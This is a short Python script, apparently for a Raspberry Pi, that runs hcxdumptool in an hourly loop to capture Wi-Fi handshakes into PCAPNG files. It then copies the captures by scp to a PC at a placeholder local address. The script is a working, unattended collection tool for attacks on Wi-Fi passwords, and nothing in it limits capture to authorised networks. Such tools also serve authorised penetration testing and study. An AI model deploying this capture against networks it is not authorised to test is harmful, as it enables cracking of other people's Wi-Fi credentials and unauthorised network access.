import os
import time
import subprocess
import logging
from datetime import datetime

# Configure logging
logging.basicConfig(filename='wifi_collector.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Output directory for PCAPNG files
output_dir = "/home/pi/wifi_data"
os.makedirs(output_dir, exist_ok=True)

def run_hcxdumptool():
    """Run hcxdumptool to capture Wi-Fi handshakes."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_file = os.path.join(output_dir, f"wifi_capture_{timestamp}.pcapng")
    
    command = [
        "sudo", "hcxdumptool",
        "-i", "wlan1",  # Replace with your Wi-Fi interface
        "-o", output_file,
        "--enable_status=1"
    ]
    
    try:
        logging.info("Starting hcxdumptool...")
        subprocess.run(command, check=True)
    except subprocess.CalledProcessError as e:
        logging.error(f"hcxdumptool failed: {e}")
    except KeyboardInterrupt:
        logging.info("hcxdumptool stopped by user.")

def sync_data():
    """Sync data with PC over Wi-Fi or USB."""
    # Example: Sync over SCP (Wi-Fi)
    pc_ip = "192.168.1.100"  # Replace with your PC's IP
    pc_user = "raspberry"         # Replace with your PC's username
    pc_dir = "dir"
    
    sync_command = [
        "scp", "-r", output_dir, f"{pc_user}@{pc_ip}:{pc_dir}"
    ]
    
    try:
        logging.info("Syncing data with PC...")
        subprocess.run(sync_command, check=True)
        logging.info("Data sync completed.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Data sync failed: {e}")

if __name__ == "__main__":
    try:
        while True:
            run_hcxdumptool()
            sync_data()
            time.sleep(3600)  # Sync every hour
    except Exception as e:
        logging.error(f"Unexpected error: {e}")